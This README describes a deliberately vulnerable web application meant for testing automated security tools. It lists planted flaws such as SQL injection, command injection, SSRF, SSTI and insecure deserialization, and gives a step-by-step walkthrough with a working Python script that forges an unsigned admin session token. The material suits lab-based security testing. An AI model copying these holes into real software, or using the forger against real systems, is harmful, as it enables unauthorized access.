# Borgor Science: Professional Grill Architect Portal

This is a professional-themed web application designed with various intentional vulnerabilities to test and evaluate automated security frameworks like **PenAI and other similar security frameworks**.

## Platform Features & Hidden Vulnerabilities

To simulate a real-world environment, vulnerabilities are integrated into seemingly legitimate functional modules:

- **SQL Injection (SQLi):**
  - **Staff Login:** Standard SQLi in the authentication module.
  - **Kitchen Profile:** SQLi in the "Kitchen Motto" update field.
- **Weak JWT Session Authentication:**
  - **Kitchen Session Cookie:** Authentication trusts a client-side JWT-like cookie (`kitchen_token`) with `alg: none`, no signature, and reversible no-key payload obfuscation.
- **Stored Cross-Site Scripting (XSS):**
  - **Community Kitchen Notes:** Malicious scripts can be stored in the public culinary tips section.
- **OS Command Injection:**
  - **Kitchen Server Diagnostic:** Exploitable via the "Server Heartbeat" tool (`/ping-service`).
- **Server-Side Request Forgery (SSRF):**
  - **Node Communication Tester:** Exploitable via the internal network diagnostic tool (`/internal-network-test`).
- **Path Traversal / Local File Inclusion (LFI):**
  - **Asset Explorer:** Access sensitive files via the `/asset-viewer` module.
- **Insecure Deserialization:**
  - **Session Monitor:** Exploitable via the staff debug token decoder (`/session-debug`).
- **Server-Side Template Injection (SSTI):**
  - **Personalized Greetings:** Exploitable via the guest greeting generator (`/say-hello`).
- **Broken Access Control:**
  - **Kitchen Secrets Vault:** Insecure access to the Senior Grill Architect vault (`/kitchen-secrets`).
- **Insecure Direct Object Reference (IDOR):**
  - **View Burger Profile:** Authenticated users are redirected to their own tokenized profile URL, but swapping the `token` in `/view-burger-profile?token=<token>` can expose other users' burger profiles.
- **CVE-2025-50817 (Side-Loading):**
  - **Ingredient Sync:** Triggered via the `/sync-ingredients` route after uploading a malicious `test.py` through the Recipe Image Uploader.
- **Cross-Site Request Forgery (CSRF):** Profile updates and kitchen notes lack CSRF protection.

## Setup and Running

### Installation
```bash
pip install -r requirements.txt
python3 setup.py # Initializes the database with the Borgor Science schema
```

### Running the Portal
```bash
python3 vuln_app.py
```

### Using the Dockerfile
```bash
docker build -t borgor-vuln .
docker run --rm --name borgor-vuln -p 5000:5000 borgor-vuln
```
- App URL: `http://127.0.0.1:5000`
- The image initializes `app.db` during build (`RUN python setup.py` in `Dockerfile`).
- To refresh seeded data in a container workflow, rebuild the image:
```bash
docker build --no-cache -t borgor-vuln .
```

### Create Test Accounts
- Register at `/register` to create a user with a personalized burger profile.
- Use `/view-burger-profile` while logged in to see your own profile first, then replace the `token` in the URL to validate IDOR behavior.

### JWT Exploit Walkthrough (Lab Only)
The app uses a weak cookie token named `kitchen_token`:
- Header includes `alg: none` (no signature verification).
- Payload is only obfuscated with reversible character shifting + base64url.
- There is no secret key to crack, so HMAC brute-force tools are unnecessary for this JWT weakness.

Exploit steps:
1. Login or register as any user.
2. Capture your `kitchen_token` cookie from browser devtools or an intercepting proxy.
3. Decode and de-obfuscate payload, change `"id"` to `"admin"`, and set `"exp"` to a future timestamp.
4. Re-obfuscate and re-encode payload, then rebuild token as `header.payload.` (empty signature).
5. Replace the `kitchen_token` cookie with the forged token and browse to `/kitchen-secrets`.

Example token forger:
```bash
python3 - <<'PY'
import base64
import json
import time

token = "PASTE_KITCHEN_TOKEN_HERE"
header_seg, payload_seg, _ = token.split(".")

def weak_shift(value, shift):
    return ''.join(chr((ord(char) + shift) % 256) for char in value)

def b64url_decode(segment):
    segment += "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment).decode("latin1")

def b64url_encode(value):
    return base64.urlsafe_b64encode(value.encode("latin1")).decode().rstrip("=")

payload = json.loads(weak_shift(b64url_decode(payload_seg), -4))
payload["id"] = "admin"
payload["exp"] = int(time.time()) + 3600

new_payload_seg = b64url_encode(weak_shift(json.dumps(payload, separators=(",", ":")), 4))
forged = f"{header_seg}.{new_payload_seg}."
print(forged)
PY
```

### Testing CVE-2025-50817
A dedicated Proof of Concept script is provided:
```bash
python3 poc_cve_2025_50817.py
```

## Security Warning
**WARNING:** This application is intentionally vulnerable and contains dangerous features (like RCE via side-loading and deserialization). **NEVER** run this on a public-facing server or any untrusted network. Use only in a controlled, isolated testing environment.
